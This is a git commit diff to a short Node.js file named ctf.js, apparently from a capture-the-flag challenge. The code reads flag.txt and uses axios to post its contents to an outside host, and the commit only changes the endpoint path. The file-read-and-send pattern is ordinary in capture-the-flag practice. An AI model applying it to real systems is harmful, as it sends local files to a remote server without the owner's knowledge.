db01c490850bc05b3f9178ea1b1d97772fa69fb8
Gabriel Lugarinho <119335347+GabrielLugarinho@users.noreply.github.com>
2024-09-15 16:52:22 -0300

    Update ctf.js

--- ctf.js
+++ ctf.js
@@ -3,5 +3,5 @@ const axios = require('axios');
 
 fs.readFile('flag.txt', 'utf8', (err, data) => {
     if (err) throw err;
-    axios.post('https://integridade.challenges.cfd/flag', { flag: data });
+    axios.post('https://integridade.challenges.cfd/', { flag: data });
 });
